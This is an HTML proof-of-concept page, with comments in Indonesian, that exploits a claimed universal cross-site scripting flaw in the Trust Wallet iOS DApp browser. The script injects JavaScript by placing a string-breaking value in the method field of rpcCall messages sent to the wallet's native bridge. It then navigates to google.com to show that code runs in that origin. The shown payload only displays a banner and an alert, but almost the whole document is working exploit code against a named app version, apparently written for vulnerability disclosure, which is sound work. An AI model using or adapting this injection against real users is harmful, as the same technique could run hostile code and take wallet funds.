<!doctype html>
<html lang="id"><head><meta charset="utf-8">
<title>Trust Wallet iOS UXSS — dummy PoC</title></head><body>
<a id="run" href="https://google.com/">RUN</a>
<pre id="status">dummy PoC</pre>
<script>
'use strict';
const runLink = document.querySelector('#run');
const status  = document.querySelector('#status');
const target  = 'https://google.com/';

// Payload dummy: HANYA buktikan origin. Tanpa wallet, tanpa sign, tanpa transfer.
const impact = [
  '(async()=>{',
  String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
  'if(window.__twUxss)return;window.__twUxss=1;',
  "document.body?.insertAdjacentHTML('afterbegin','<h1 id=tw-uxss>UXSS PoC: JS executed in host WebView context</h1>');",
  'alert(document.domain);',   // tampil "google.com" saat boundary bobol
  '})();'
].join(' ');

const marker = `zz_");${impact}//`;
runLink.addEventListener('click', e => {
  e.preventDefault();
  const bridge = window.webkit?.messageHandlers?._tw_;
  if(!bridge?.postMessage || !window.trustwallet?.ethereum){
    status.textContent='Buka di DApp browser Trust Wallet iOS 26.38.20.';return;
  }
  const baseId = Math.trunc(Date.now()%9e15);
  for(let i=0;i<8;i++){
    bridge.postMessage({id:baseId+i,network:'ethereum',name:'rpcCall',
      object:{method:marker,params:[],jsonrpc:'2.0'}});
  }
  status.textContent='RPC dikirim; navigasi ke '+target;
  setTimeout(()=>location.assign(target),120);
},{once:true});
</script></body></html>
